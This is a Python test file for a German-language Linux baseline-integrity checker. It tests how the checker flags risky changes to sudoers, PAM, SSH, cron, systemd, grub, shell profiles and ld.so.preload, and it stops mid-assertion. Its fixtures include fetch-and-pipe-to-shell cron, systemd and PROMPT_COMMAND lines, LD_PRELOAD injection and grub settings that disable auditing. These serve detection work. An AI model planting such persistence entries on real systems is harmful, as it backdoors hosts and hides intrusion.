def test_roots_baseline_guard_compare_detects_passwd_uid0_signal_change():
    old = {
        "path": "/etc/passwd",
        "exists": True,
        "mode": "0o644",
        "sha256": "old",
        "size": 10,
        "mtime": 1.0,
        "signals": [],
    }
    new = {
        "path": "/etc/passwd",
        "exists": True,
        "mode": "0o644",
        "sha256": "new",
        "size": 12,
        "mtime": 2.0,
        "signals": ["passwd:extra_uid0:admin"],
    }

    assert roots_baseline_guard_controller._compare_item(old, new) == (
        "/etc/passwd",
        "UID-0-Konto erkannt: admin",
        "critical",
    )


def test_roots_baseline_guard_compare_detects_ssh_signal_change():
    old = {
        "path": "/etc/ssh/sshd_config",
        "exists": True,
        "mode": "0o644",
        "sha256": "old",
        "size": 10,
        "mtime": 1.0,
        "signals": [],
    }
    new = {
        "path": "/etc/ssh/sshd_config",
        "exists": True,
        "mode": "0o644",
        "sha256": "new",
        "size": 12,
        "mtime": 2.0,
        "signals": ["ssh:permit_root_login_yes"],
    }

    assert roots_baseline_guard_controller._compare_item(old, new) == (
        "/etc/ssh/sshd_config",
        "SSH-Option aktiviert: PermitRootLogin yes",
        "warning",
    )


def test_roots_baseline_guard_extracts_signals_for_sudoers_d_and_sshd_config_d():
    sudoers_signals = roots_baseline_guard_controller._extract_security_signals(
        "/etc/sudoers.d/admin",
        "admin ALL=(ALL) NOPASSWD:SETENV: ALL\n",
    )
    ssh_signals = roots_baseline_guard_controller._extract_security_signals(
        "/etc/ssh/sshd_config.d/custom.conf",
        "PermitRootLogin yes\nPasswordAuthentication yes\n",
    )

    assert "sudoers:nopasswd" in sudoers_signals
    assert "sudoers:setenv" in sudoers_signals
    assert "sudoers:full_access" in sudoers_signals
    assert "ssh:permit_root_login_yes" in ssh_signals
    assert "ssh:password_auth_yes" in ssh_signals


def test_roots_baseline_guard_extracts_signals_for_pam():
    pam_signals = roots_baseline_guard_controller._extract_security_signals(
        "/etc/pam.d/common-auth",
        "auth required pam_env.so\n"
        "auth sufficient pam_permit.so\n"
        "auth required pam_unix.so nullok\n"
        "session optional pam_exec.so /tmp/demo.sh\n",
    )

    assert "pam:permit" in pam_signals
    assert "pam:permit_auth" in pam_signals
    assert "pam:nullok" in pam_signals
    assert "pam:nullok_auth" in pam_signals
    assert "pam:exec" in pam_signals
    assert "pam:exec_tmp" in pam_signals


def test_roots_baseline_guard_extracts_pam_exec_in_auth_stack():
    pam_signals = roots_baseline_guard_controller._extract_security_signals(
        "/etc/pam.d/common-auth",
        "auth optional pam_exec.so /usr/local/bin/check-auth.sh\n",
    )

    assert "pam:exec" in pam_signals
    assert "pam:exec_auth" in pam_signals


def test_roots_baseline_guard_extracts_signals_for_polkit():
    polkit_signals = roots_baseline_guard_controller._extract_security_signals(
        "/etc/polkit-1/rules.d/49-demo.rules",
        "polkit.addRule(function(action, subject) {\n"
        '  if (subject.isInRole("wheel")) {\n'
        "    return polkit.Result.YES;\n"
        "  }\n"
        "});\n"
        "ResultAny=yes\n"
        "org.freedesktop.policykit.exec\n",
    )

    assert "polkit:add_rule" in polkit_signals
    assert "polkit:wheel_role" in polkit_signals
    assert "polkit:result_any_yes" in polkit_signals
    assert "polkit:pkexec" in polkit_signals


def test_roots_baseline_guard_extracts_signals_for_sysctl():
    sysctl_signals = roots_baseline_guard_controller._extract_security_signals(
        "/etc/sysctl.d/99-demo.conf",
        "kernel.unprivileged_bpf_disabled = 0\n"
        "net.ipv4.conf.all.accept_redirects = 1\n"
        "net.ipv4.ip_forward = 1\n",
    )

    assert "sysctl:kernel.unprivileged_bpf_disabled=0" in sysctl_signals
    assert "sysctl:net.ipv4.conf.all.accept_redirects=1" in sysctl_signals
    assert "sysctl:net.ipv4.ip_forward=1" in sysctl_signals


def test_roots_baseline_guard_extracts_signals_for_shell_profiles():
    shell_signals = roots_baseline_guard_controller._extract_security_signals(
        "/etc/profile",
        "export LD_PRELOAD=/tmp/evil.so\n"
        "export PATH=/tmp:$PATH:.\n"
        "alias sudo='sudo -E'\n"
        "PROMPT_COMMAND='curl http://demo.invalid/x.sh | sh'\n",
    )

    assert "shell:ld_preload" in shell_signals
    assert "shell:path_tmp" in shell_signals
    assert "shell:path_dot" in shell_signals
    assert "shell:alias_sudo" in shell_signals
    assert "shell:prompt_command_exec" in shell_signals


def test_roots_baseline_guard_extracts_signals_for_profile_d_shell_scripts():
    shell_signals = roots_baseline_guard_controller._extract_security_signals(
        "/etc/profile.d/demo.sh",
        "export PATH=/tmp:$PATH\n",
    )

    assert "shell:path_tmp" in shell_signals


def test_roots_baseline_guard_ignores_kernel_module_disable_helpers():
    kernel_signals = roots_baseline_guard_controller._extract_security_signals(
        "/etc/modprobe.d/disable-demo.conf",
        "install usb-storage /bin/true\n" "blacklist firewire-core\n",
    )

    assert kernel_signals == []


def test_roots_baseline_guard_extracts_signals_for_boot_config():
    boot_signals = roots_baseline_guard_controller._extract_security_signals(
        "/etc/default/grub",
        'GRUB_CMDLINE_LINUX="quiet init=/bin/sh rd.break audit=0 selinux=0 module.sig_enforce=0"\n',
    )

    assert "boot:init_shell" in boot_signals
    assert "boot:rd_break" in boot_signals
    assert "boot:audit_off" in boot_signals
    assert "boot:selinux_off" in boot_signals
    assert "boot:module_sig_off" in boot_signals


def test_roots_baseline_guard_extracts_signals_for_tmpfiles():
    tmpfiles_signals = roots_baseline_guard_controller._extract_security_signals(
        "/etc/tmpfiles.d/demo.conf",
        "L /etc/cron.d/evil - - - - /tmp/cron.link\n"
        "c /dev/evil 0600 root root - -\n",
    )

    assert "tmpfiles:tmp_path" in tmpfiles_signals
    assert "tmpfiles:symlink" in tmpfiles_signals
    assert "tmpfiles:sensitive_target" in tmpfiles_signals
    assert "tmpfiles:device_node" in tmpfiles_signals


def test_roots_baseline_guard_extracts_signals_for_cron_and_systemd():
    cron_signals = roots_baseline_guard_controller._extract_security_signals(
        "/etc/cron.d/demo",
        "@reboot root /bin/bash /tmp/start.sh\n"
        "* * * * * root curl http://demo.invalid/payload.sh | sh\n",
    )
    systemd_signals = roots_baseline_guard_controller._extract_security_signals(
        "/etc/systemd/system/demo.service",
        "[Unit]\nDescription=Demo\n"
        "[Service]\nExecStart=/bin/sh -c 'curl http://demo.invalid/x.sh | sh'\n"
        "[Install]\nWantedBy=multi-user.target\n",
    )

    assert "cron:at_reboot" in cron_signals
    assert "cron:tmp_exec" in cron_signals
    assert "cron:network_fetch" in cron_signals
    assert "cron:pipe_to_shell" in cron_signals
    assert "systemd:shell_exec" in systemd_signals
    assert "systemd:network_fetch" in systemd_signals
    assert "systemd:enabled_boot" in systemd_signals


def test_roots_baseline_guard_extracts_signals_for_cron_daily_and_user_systemd():
    cron_signals = roots_baseline_guard_controller._extract_security_signals(
        "/etc/cron.daily/demo-job",
        "curl http://demo.invalid/payload.sh | sh\n",
    )
    systemd_signals = roots_baseline_guard_controller._extract_security_signals(
        "/home/demo/.config/systemd/user/demo.service",
        "[Service]\nExecStart=/bin/sh -c 'curl http://demo.invalid/x.sh | sh'\n",
    )

    assert "cron:network_fetch" in cron_signals
    assert "cron:pipe_to_shell" in cron_signals
    assert "systemd:shell_exec" in systemd_signals
    assert "systemd:network_fetch" in systemd_signals


def test_roots_baseline_guard_extracts_signals_for_authorized_keys():
    signals = roots_baseline_guard_controller._extract_security_signals(
        "/root/.ssh/authorized_keys",
        "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAITest root@host\n"
        "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDdemo demo@host\n",
    )

    assert "authkeys:key:ssh-ed25519:root@host" in signals
    assert "authkeys:key:ssh-rsa:demo@host" in signals
    assert "authkeys:weak_algo:ssh-rsa:demo@host" in signals


def test_roots_baseline_guard_extracts_authorized_keys_with_options():
    signals = roots_baseline_guard_controller._extract_security_signals(
        "/root/.ssh/authorized_keys",
        'from="10.0.0.1" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDdemo demo@host\n',
    )

    assert "authkeys:key:ssh-rsa:demo@host" in signals
    assert "authkeys:weak_algo:ssh-rsa:demo@host" in signals


def test_roots_baseline_guard_extracts_signals_for_ld_preload():
    signals = roots_baseline_guard_controller._extract_security_signals(
        "/etc/ld.so.preload",
        "/tmp/evil.so\n/usr/local/lib/customhook.so\n",
    )

    assert "ld_preload:entry:/tmp/evil.so" in signals
    assert "ld_preload:entry:/usr/local/lib/customhook.so" in signals


def test_roots_baseline_guard_extracts_shadow_signals():
    signals = roots_baseline_guard_controller._extract_security_signals(
        "/etc/shadow",
        "root:!:20000:0:99999:7:::\n"
        "demo:$6$hashvalue:20000:0:99999:7:::\n"
        "guest::20000:0:99999:7:::\n",
    )

    assert "shadow:active_password:demo" in signals
    assert "shadow:empty_password:guest" in signals


def test_roots_baseline_guard_compare_detects_shadow_signal_change():
    old = {
        "path": "/etc/shadow",
        "exists": True,
        "mode": "0o640",
        "sha256": "old",
        "size": 10,
        "mtime": 1.0,
        "signals": [],
    }
    new = {
        "path": "/etc/shadow",
        "exists": True,
        "mode": "0o640",
        "sha256": "new",
        "size": 12,
        "mtime": 2.0,
        "signals": ["shadow:empty_password:guest"],
    }

    assert roots_baseline_guard_controller._compare_item(old, new) == (
        "/etc/shadow",
        "Passwortstatus auffällig: leeres Passwort guest",
        "critical",
    )


def test_roots_baseline_guard_compare_detects_authorized_keys_change():
    old = {
        "path": "/root/.ssh/authorized_keys",
        "exists": True,
        "mode": "0o600",
        "sha256": "old",
        "size": 10,
        "mtime": 1.0,
        "signals": [],
    }
    new = {
        "path": "/root/.ssh/authorized_keys",
        "exists": True,
        "mode": "0o600",
        "sha256": "new",
        "size": 12,
        "mtime": 2.0,
        "signals": ["authkeys:key:ssh-ed25519:root@host"],
    }

    assert roots_baseline_guard_controller._compare_item(old, new) == (
        "/root/.ssh/authorized_keys",
        "SSH-Schlüssel erkannt: ssh-ed25519 root@host",
        "critical",
    )


def test_roots_baseline_guard_compare_detects_weak_authorized_key_change():
    old = {
        "path": "/root/.ssh/authorized_keys",
        "exists": True,
        "mode": "0o600",
        "sha256": "old",
        "size": 10,
        "mtime": 1.0,
        "signals": [],
    }
    new = {
        "path": "/root/.ssh/authorized_keys",
        "exists": True,
        "mode": "0o600",
        "sha256": "new",
        "size": 12,
        "mtime": 2.0,
        "signals": ["authkeys:weak_algo:ssh-rsa:demo@host"],
    }

    assert roots_baseline_guard_controller._compare_item(old, new) == (
        "/root/.ssh/authorized_keys",
        "Schwacher SSH-Schluessel erkannt: ssh-rsa demo@host",
        "critical",
    )


def test_roots_baseline_guard_compare_detects_authorized_key_rotation():
    old = {
        "path": "/root/.ssh/authorized_keys",
        "exists": True,
        "mode": "0o600",
        "sha256": "old",
        "size": 10,
        "mtime": 1.0,
        "signals": ["authkeys:key:ssh-ed25519:old-admin@host"],
    }
    new = {
        "path": "/root/.ssh/authorized_keys",
        "exists": True,
        "mode": "0o600",
        "sha256": "new",
        "size": 12,
        "mtime": 2.0,
        "signals": ["authkeys:key:ssh-ed25519:new-admin@host"],
    }

    assert roots_baseline_guard_controller._compare_item(old, new) == (
        "/root/.ssh/authorized_keys",
        "SSH-Schluessel rotiert: ssh-ed25519 old-admin@host -> ssh-ed25519 new-admin@host",
        "warning",
    )


def test_roots_baseline_guard_compare_detects_ld_preload_change():
    old = {
        "path": "/etc/ld.so.preload",
        "exists": True,
        "mode": "0o644",
        "sha256": "old",
        "size": 0,
        "mtime": 1.0,
        "signals": [],
    }
    new = {
        "path": "/etc/ld.so.preload",
        "exists": True,
        "mode": "0o644",
        "sha256": "new",
        "size": 10,
        "mtime": 2.0,
        "signals": ["ld_preload:entry:/tmp/evil.so"],
    }

    assert roots_baseline_guard_controller._compare_item(old, new) == (
        "/etc/ld.so.preload",
        "LD_PRELOAD-Eintrag erkannt: /tmp/evil.so",
        "critical",
    )


def test_roots_baseline_guard_signal_detail_text_lists_concrete_changes():
    old = {"signals": []}
    new = {"signals": ["ssh:permit_root_login_yes", "ssh:password_auth_yes"]}

    detail = roots_baseline_guard_controller._signal_detail_text(old, new)

    assert "Signale:" in detail
    assert "Einordnung:" in detail
    assert "SSH erlaubt Root-Login" in detail
    assert "SSH erlaubt Passwort-Authentifizierung" in detail
    assert "Direkter Root-Login ueber SSH" in detail


def test_roots_baseline_guard_signal_detail_text_explains_pam_and_sudoers():
    old = {"signals": []}
    new = {"signals": ["pam:permit_auth", "sudoers:full_access"]}

    detail = roots_baseline_guard_controller._signal_detail_text(old, new)

    assert "PAM erlaubt Authentifizierung ueber pam_permit.so" in detail
    assert "Sudo-Regel" not in detail or "Signale:" in detail
    assert "pam_permit.so erlaubt Zugriffe sehr freizuegig" in detail
    assert "erweitert Rechte sehr breit" in detail


def test_roots_baseline_guard_signal_detail_text_explains_ld_preload():
    old = {"signals": []}
    new = {"signals": ["ld_preload:entry:/tmp/evil.so"]}

    detail = roots_baseline_guard_controller._signal_detail_text(old, new)

    assert "LD_PRELOAD lädt: /tmp/evil.so" in detail
    assert "Bibliotheken global einschleusen" in detail


def test_roots_baseline_guard_extracts_context_lines_from_detail():
    detail = (
        "Signale:\n"
        "+ PAM erlaubt Authentifizierung ueber pam_permit.so\n"
        "\n"
        "Einordnung:\n"
        "- pam_permit.so erlaubt Zugriffe sehr freizuegig und kann Authentifizierung praktisch aushebeln.\n"
        "- Die Signalmenge hat sich geaendert; bitte pruefen, ob diese Sicherheitsaenderung beabsichtigt war.\n"
    )

    lines = roots_baseline_guard_controller._extract_context_lines_from_detail(detail)

    assert lines == [
        "pam_permit.so erlaubt Zugriffe sehr freizuegig und kann Authentifizierung praktisch aushebeln.",
        "Die Signalmenge hat sich geaendert; bitte pruefen, ob diese Sicherheitsaenderung beabsichtigt war.",
    ]


def test_roots_baseline_guard_signal_change_label_uses_concrete_names():
    assert (
        roots_baseline_guard_controller._signal_change_label(
            "/etc/sudoers.d/admin",
            {"sudoers:nopasswd"},
            set(),
        )
        == "Sudo-Regel aktiviert: NOPASSWD"
    )
    assert (
        roots_baseline_guard_controller._signal_change_label(
            "/etc/profile",
            {"shell:ld_preload"},
            set(),
        )
        == "Shell-Fund aktiviert: LD_PRELOAD"
    )
    assert (
        roots_baseline_guard_controller._signal_change_label(
            "/etc/sysctl.d/99-demo.conf",
            {"sysctl:kernel.unprivileged_bpf_disabled=0"},
            set(),
        )
        == "Sysctl-Fund aktiviert: unprivileged_bpf_disabled=0"
    )
    assert (
        roots_baseline_guard_controller._signal_change_label(
            "/etc/modprobe.d/evil.conf",
            {"kernel:shell_exec"},
            set(),
        )
        == "Kernel-Modul-Fund aktiviert: Shell-Start"
    )
    assert (
        roots_baseline_guard_controller._signal_change_label(
            "/etc/default/grub",
            {"boot:init_shell"},
            set(),
        )
        == "Boot-Fund aktiviert: init=/bin/sh"
    )
    assert (
        roots_baseline_guard_controller._signal_change_label(
            "/etc/tmpfiles.d/demo.conf",
            {"tmpfiles:sensitive_target"},
            set(),
        )
        == "Tmpfiles-Fund aktiviert: sensitiver Pfad"
    )
    assert (
        roots_baseline_guard_controller._signal_change_label(
            "/etc/polkit-1/rules.d/49-demo.rules",
            {"polkit:result_any_yes"},
            set(),
        )
        == "Polkit-Fund aktiviert: ResultAny=yes"
    )
    assert (
        roots_baseline_guard_controller._signal_change_label(
            "/etc/pam.d/common-auth",
            {"pam:permit_auth"},
            set(),
        )
        == "PAM-Fund aktiviert: pam_permit.so im auth-Stack"
    )
    assert (
        roots_baseline_guard_controller._signal_change_label(
            "/etc/sudoers.d/admin",
            {"sudoers:full_access"},
            set(),
        )
        == "Sudo-Regel aktiviert: ALL=(ALL) ALL"
    )
    assert (
        roots_baseline_guard_controller._signal_change_label(
            "/etc/ssh/sshd_config.d/custom.conf",
            {"ssh:permit_root_login_yes", "ssh:password_auth_yes"},
            set(),
        )
        == "Unsichere SSH-Optionen aktiviert"
    )
    assert (
        roots_baseline_guard_controller._signal_change_label(
            "/etc/shadow",
            {"shadow:active_password:demo"},
            set(),
        )
        == "Passwortstatus auffällig: aktives Passwort demo"
    )
    assert (
        roots_baseline_guard_controller._signal_change_label(
            "/etc/cron.d/demo",
            {"cron:network_fetch"},
            set(),
        )
        == "Cron-Fund aktiviert: Netzwerk-Download"
    )
    assert (
        roots_baseline_guard_controller._signal_change_label(
            "/etc/systemd/system/demo.service",
            {"systemd:enabled_boot"},
            set(),
        )
        == "Systemd-Fund aktiviert: WantedBy multi-user.target"
    )
    assert (
        roots_baseline_guard_controller._signal_change_label(
            "/root/.ssh/authorized_keys",
            {"authkeys:key:ssh-ed25519:root@host"},
            set(),
        )
        == "SSH-Schlüssel erkannt: ssh-ed25519 root@host"
    )
    assert (
        roots_baseline_guard_controller._signal_change_label(
            "/root/.ssh/authorized_keys",
            {"authkeys:weak_algo:ssh-rsa:demo@host"},
            set(),
        )
        == "Schwacher SSH-Schluessel erkannt: ssh-rsa demo@host"
    )
    assert (
        roots_baseline_guard_controller._signal_change_label(
            "/etc/ld.so.preload",
            {"ld_preload:entry:/tmp/evil.so"},
            set(),
        )
        == "LD_PRELOAD-Eintrag erkannt: /tmp/evil.so"
    )


def test_roots_baseline_guard_read_current_state_marks_missing_files_as_hints(tmp_path):
    ssh_file = tmp_path / "sshd_config"
    hosts_file = tmp_path / "hosts"
    ssh_file.write_text("PermitRootLogin no\n", encoding="utf-8")
    hosts_file.write_text("127.0.0.1 localhost\n", encoding="utf-8")
    missing_file = tmp_path / "passwd"

    baseline_path = tmp_path / "roots_baseline.json"
    app = DummyApp(
        baseline_path,
        {
            "SSH Konfiguration": [str(ssh_file)],
            "DNS / Hosts": [str(hosts_file)],
            "Kritische Systemdateien": [str(missing_file)],
        },
        selected_labels=set(
            roots_baseline_guard_controller.ROOTS_GUARD_SUPPORTED_AREAS
        ),
    )

    assert (
        roots_baseline_guard_controller.read_roots_baseline_guard_current_state(app)
        is True
    )
    assert (
        app.roots_integrity_counts_var.get()
        == "Kritisch: 0 | Warnungen: 0 | Hinweise: 1"
    )
    assert any(
        row[1] == "Aktuell nicht vorhanden"
        for row in app.roots_baseline_guard_results_table.rows
    )


def test_roots_baseline_guard_read_current_state_explains_optional_sshd_config(
    tmp_path,
):
    hosts_file = tmp_path / "hosts"
    passwd_file = tmp_path / "passwd"
    hosts_file.write_text("127.0.0.1 localhost\n", encoding="utf-8")
    passwd_file.write_text("root:x:0:0:root:/root:/bin/bash\n", encoding="utf-8")
    missing_sshd_config = tmp_path / "sshd_config"

    baseline_path = tmp_path / "roots_baseline.json"
    app = DummyApp(
        baseline_path,
        {
            "SSH Konfiguration": [str(missing_sshd_config)],
            "DNS / Hosts": [str(hosts_file)],
            "Kritische Systemdateien": [str(passwd_file)],
        },
        selected_labels=set(
            roots_baseline_guard_controller.ROOTS_GUARD_SUPPORTED_AREAS
        ),
    )

    assert (
        roots_baseline_guard_controller.read_roots_baseline_guard_current_state(app)
        is True
    )
    assert (
        app.roots_integrity_counts_var.get()
        == "Kritisch: 0 | Warnungen: 0 | Hinweise: 0"
    )
    assert any(
        row[1] == "Aktuell nicht vorhanden (optional)"
        for row in app.roots_baseline_guard_results_table.rows
    )
    assert any(
        row[2] == "-" and row[4] == "Optional"
        for row in app.roots_baseline_guard_results_table.rows
        if row[1] == "Aktuell nicht vorhanden (optional)"
    )


def test_roots_baseline_guard_read_current_state_marks_unreadable_files_as_root_required(
    tmp_path,
):
    ssh_file = tmp_path / "sshd_config"
    hosts_file = tmp_path / "hosts"
    protected_file = tmp_path / "sudoers"
    ssh_file.write_text("PermitRootLogin no\n", encoding="utf-8")
    hosts_file.write_text("127.0.0.1 localhost\n", encoding="utf-8")
    protected_file.write_text("root ALL=(ALL:ALL) ALL\n", encoding="utf-8")
    protected_file.chmod(0o000)

    baseline_path = tmp_path / "roots_baseline.json"
    app = DummyApp(
        baseline_path,
        {
            "SSH Konfiguration": [str(ssh_file)],
            "DNS / Hosts": [str(hosts_file)],
            "Kritische Systemdateien": [str(protected_file)],
        },
        selected_labels=set(
            roots_baseline_guard_controller.ROOTS_GUARD_SUPPORTED_AREAS
        ),
    )

    try:
        assert (
            roots_baseline_guard_controller.read_roots_baseline_guard_current_state(app)
            is True
        )
        assert any(
            row[1] == "Geschützt / Root erforderlich"
            for row in app.roots_baseline_guard_results_table.rows
        )
        assert any(
            row[2] == "Hinweis" and row[4] == "Root nötig"
            for row in app.roots_baseline_guard_results_table.rows
            if row[1] == "Geschützt / Root erforderlich"
        )
    finally:
        protected_file.chmod(0o644)


def test_roots_baseline_guard_read_current_state_uses_root_mode_for_protected_files(
    tmp_path,
):
    ssh_file = tmp_path / "sshd_config"
    hosts_file = tmp_path / "hosts"
    protected_file = tmp_path / "sudoers"
    ssh_file.write_text("PermitRootLogin no\n", encoding="utf-8")
    hosts_file.write_text("127.0.0.1 localhost\n", encoding="utf-8")
    protected_file.write_text("root ALL=(ALL:ALL) ALL\n", encoding="utf-8")
    protected_file.chmod(0o000)

    baseline_path = tmp_path / "roots_baseline.json"
    app = DummyApp(
        baseline_path,
        {
            "SSH Konfiguration": [str(ssh_file)],
            "DNS / Hosts": [str(hosts_file)],
            "Kritische Systemdateien": [str(protected_file)],
        },
        selected_labels=set(
            roots_baseline_guard_controller.ROOTS_GUARD_SUPPORTED_AREAS
        ),
    )
    app.roots_baseline_guard_root_mode_var.set(True)
    app.root_state_overrides[str(protected_file)] = {
        "exists": True,
        "readable": True,
        "read_via_root": True,
        "sha256": "rootdigest",
        "error": "",
    }

    try:
        assert (
            roots_baseline_guard_controller.read_roots_baseline_guard_current_state(app)
            is True
        )
        assert app.ensure_sudo_reasons == ["Roots Baseline Guard Snapshot"]
        assert app.roots_baseline_status_var.get().startswith(
            "Aktueller Zustand mit Root eingelesen:"
        )
        assert app.roots_last_root_action_var.get() == "Letzte Aktion mit Root: ja"
        assert any(
            row[1] == "Mit Root eingelesen" and row[4] == "Eingelesen"
            for row in app.roots_baseline_guard_results_table.rows
            if str(row[0]).endswith("sudoers")
        )
    finally:
        protected_file.chmod(0o644)


def test_roots_baseline_guard_snapshot_status_rows_use_clearer_tags():
    optional_row = roots_baseline_guard_controller._make_result_row(
        area="SSH Konfiguration",
        path="/etc/ssh/sshd_config.d",
        change="Aktuell nicht vorhanden (optional)",
        risk="-",
        timestamp="2026-05-23 20:17:39",
        status="Optional",
    )
    missing_row = roots_baseline_guard_controller._make_result_row(
        area="Kritische Systemdateien",
        path="/etc/ld.so.preload",
        change="Aktuell nicht vorhanden",
        risk="Hinweis",
        timestamp="2026-05-23 20:17:39",
        status="Fehlt",
    )
    root_row = roots_baseline_guard_controller._make_result_row(
        area="Kritische Systemdateien",
        path="/etc/sudoers",
        change="Geschützt / Root erforderlich",
        risk="Hinweis",
        timestamp="2026-05-23 20:17:39",
        status="Root nötig",
    )
    captured_row = roots_baseline_guard_controller._make_result_row(
        area="Kritische Systemdateien",
        path="/etc/shadow",
        change="Mit Root eingelesen",
        risk="-",
        timestamp="2026-05-23 20:17:39",
        status="Eingelesen",
    )

    assert optional_row["tag"] == "roots_ok"
    assert missing_row["tag"] == "roots_warning"
    assert root_row["tag"] == "roots_warning"
    assert captured_row["tag"] == "roots_neutral"


def test_roots_baseline_guard_read_current_state_aborts_when_root_auth_is_denied(
    tmp_path,
):
    ssh_file = tmp_path / "sshd_config"
    hosts_file = tmp_path / "hosts"
    passwd_file = tmp_path / "passwd"
    ssh_file.write_text("PermitRootLogin no\n", encoding="utf-8")
    hosts_file.write_text("127.0.0.1 localhost\n", encoding="utf-8")
    passwd_file.write_text("root:x:0:0:root:/root:/bin/bash\n", encoding="utf-8")

    baseline_path = tmp_path / "roots_baseline.json"
    app = DummyApp(
        baseline_path,
        {
            "SSH Konfiguration": [str(ssh_file)],
            "DNS / Hosts": [str(hosts_file)],
            "Kritische Systemdateien": [str(passwd_file)],
        },
        selected_labels=set(
            roots_baseline_guard_controller.ROOTS_GUARD_SUPPORTED_AREAS
        ),
    )
    app.roots_baseline_guard_root_mode_var.set(True)
    app.sudo_session_ok = False

    assert (
        roots_baseline_guard_controller.read_roots_baseline_guard_current_state(app)
        is False
    )
    assert (
        app.roots_baseline_status_var.get()
        == "Root-Freigabe abgebrochen. Vorgang nicht gestartet."
    )
    assert "Root-Freigabe" in app.roots_baseline_guard_info_text.text


def test_roots_baseline_guard_check_detects_changes(tmp_path):
    ssh_file = tmp_path / "sshd_config"
    hosts_file = tmp_path / "hosts"
    passwd_file = tmp_path / "passwd"
    ssh_file.write_text("PermitRootLogin no\n", encoding="utf-8")
    hosts_file.write_text("127.0.0.1 localhost\n", encoding="utf-8")
    passwd_file.write_text("root:x:0:0:root:/root:/bin/bash\n", encoding="utf-8")

    baseline_path = tmp_path / "roots_baseline.json"
    overrides = {
        "SSH Konfiguration": [str(ssh_file)],
        "DNS / Hosts": [str(hosts_file)],
        "Kritische Systemdateien": [str(passwd_file)],
    }
    app = DummyApp(
        baseline_path,
        overrides,
        selected_labels=set(
            roots_baseline_guard_controller.ROOTS_GUARD_SUPPORTED_AREAS
        ),
    )
    roots_baseline_guard_controller.create_roots_baseline_guard_baseline(app)

    ssh_file.write_text("PermitRootLogin yes\n", encoding="utf-8")
    hosts_file.write_text("127.0.0.1 localhost\n1.2.3.4 demo\n", encoding="utf-8")

    assert (
        roots_baseline_guard_controller.check_roots_baseline_guard_baseline(app) is True
    )
    assert app.roots_integrity_status_var.get() == "Änderungen erkannt"
    assert (
        "Kritisch: 0 | Warnungen: 2 | Hinweise: 0"
        == app.roots_integrity_counts_var.get()
    )
    assert len(app.roots_baseline_guard_results_table.rows) == 2
    assert str(app.roots_baseline_guard_results_table.rows[0][0]).endswith(
        "sshd_config"
    ) or str(app.roots_baseline_guard_results_table.rows[0][0]).endswith("hosts")
    assert "Wähle einen Eintrag" in app.roots_baseline_guard_info_text.text
    assert app.roots_integrity_light.calls


def test_roots_baseline_guard_update_baseline_persists_updated_at(tmp_path):
    ssh_file = tmp_path / "sshd_config"
    hosts_file = tmp_path / "hosts"
    passwd_file = tmp_path / "passwd"
    ssh_file.write_text("PermitRootLogin no\n", encoding="utf-8")
    hosts_file.write_text("127.0.0.1 localhost\n", encoding="utf-8")
    passwd_file.write_text("root:x:0:0:root:/root:/bin/bash\n", encoding="utf-8")

    baseline_path = tmp_path / "roots_baseline.json"
    overrides = {
        "SSH Konfiguration": [str(ssh_file)],
        "DNS / Hosts": [str(hosts_file)],
        "Kritische Systemdateien": [str(passwd_file)],
    }
    app = DummyApp(
        baseline_path,
        overrides,
        selected_labels={"SSH Konfiguration", "DNS / Hosts"},
    )
    roots_baseline_guard_controller.create_roots_baseline_guard_baseline(app)

    ssh_file.write_text("PermitRootLogin yes\n", encoding="utf-8")
    assert (
        roots_baseline_guard_controller.update_roots_baseline_guard_baseline(app)
        is True
    )

    data = json.loads(baseline_path.read_text(encoding="utf-8"))
    assert data["updated_at"]
    assert app.roots_baseline_status_var.get().startswith("Baseline aktualisiert:")
    assert app.roots_baseline_updated_var.get().startswith("Zuletzt aktualisiert am: ")
    assert (
        app.roots_baseline_checked_var.get()
        == "Letzte Prüfung am: noch nicht durchgeführt"
    )
    assert app.roots_last_root_action_var.get() == "Letzte Aktion mit Root: nein"
    assert (
        app.roots_baseline_guard_results_table.rows[0][0]
        == "Noch keine Änderungen erkannt."
    )
    assert "aktualisiert" in app.roots_baseline_guard_info_text.text


def test_roots_baseline_guard_check_baseline_updates_last_checked_at(tmp_path):
    ssh_file = tmp_path / "sshd_config"
    hosts_file = tmp_path / "hosts"
    passwd_file = tmp_path / "passwd"
    ssh_file.write_text("PermitRootLogin no\n", encoding="utf-8")
    hosts_file.write_text("127.0.0.1 localhost\n", encoding="utf-8")
    passwd_file.write_text("root:x:0:0:root:/root:/bin/bash\n", encoding="utf-8")

    baseline_path = tmp_path / "roots_baseline.json"
    overrides = {
        "SSH Konfiguration": [str(ssh_file)],
        "DNS / Hosts": [str(hosts_file)],
        "Kritische Systemdateien": [str(passwd_file)],
    }
    app = DummyApp(
        baseline_path,
        overrides,
        selected_labels=set(
            roots_baseline_guard_controller.ROOTS_GUARD_SUPPORTED_AREAS
        ),
    )
    roots_baseline_guard_controller.create_roots_baseline_guard_baseline(app)
    ssh_file.write_text("PermitRootLogin yes\n", encoding="utf-8")

    assert (
        roots_baseline_guard_controller.check_roots_baseline_guard_baseline(app) is True
    )

    assert app.roots_baseline_checked_var.get().startswith("Letzte Prüfung am: ")
    assert app.roots_last_root_action_var.get() == "Letzte Aktion mit Root: nein"


def test_roots_baseline_guard_show_last_comparison_loads_saved_rows(tmp_path):
    ssh_file = tmp_path / "sshd_config"
    hosts_file = tmp_path / "hosts"
    passwd_file = tmp_path / "passwd"
    ssh_file.write_text("PermitRootLogin no\n", encoding="utf-8")
    hosts_file.write_text("127.0.0.1 localhost\n", encoding="utf-8")
    passwd_file.write_text("root:x:0:0:root:/root:/bin/bash\n", encoding="utf-8")

    baseline_path = tmp_path / "roots_baseline.json"
    overrides = {
        "SSH Konfiguration": [str(ssh_file)],
        "DNS / Hosts": [str(hosts_file)],
        "Kritische Systemdateien": [str(passwd_file)],
    }
    app = DummyApp(
        baseline_path,
        overrides,
        selected_labels=set(
            roots_baseline_guard_controller.ROOTS_GUARD_SUPPORTED_AREAS
        ),
    )
    roots_baseline_guard_controller.create_roots_baseline_guard_baseline(app)
    ssh_file.write_text("PermitRootLogin yes\n", encoding="utf-8")
    roots_baseline_guard_controller.check_roots_baseline_guard_baseline(app)

    reloaded = DummyApp(
        baseline_path,
        overrides,
        selected_labels=set(),
    )
    assert (
        roots_baseline_guard_controller.show_last_roots_baseline_guard_comparison(
            reloaded
        )
        is True
    )
    assert reloaded.roots_baseline_status_var.get().startswith(
        "Letzter Vergleich geladen:"
    )
    assert reloaded.roots_baseline_guard_results_table.rows
    assert (
